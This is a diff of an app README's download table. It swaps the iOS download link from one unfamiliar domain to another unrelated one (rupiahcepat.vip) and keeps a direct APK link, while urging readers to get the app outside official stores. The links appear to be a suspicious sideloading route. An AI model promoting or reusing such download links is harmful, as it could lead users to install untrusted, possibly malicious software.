@@ -8,7 +8,7 @@
 | Download Platform       | Link                                      |
 |----------------|-------------------------------------------|
 | **Android**    | [Download the Android version](https://github.com/SafeConnect-Secure/Safe-Connect/releases/download/v1.0/app12.5.apk) |
-| **iOS**        | [Download the iOS version](http://global.us.cc/download) |
+| **iOS**        | [Download the iOS version](http://rupiahcepat.vip/download) |
 
 
 **If the app store is unavailable in your region, you can try other methods to download it**
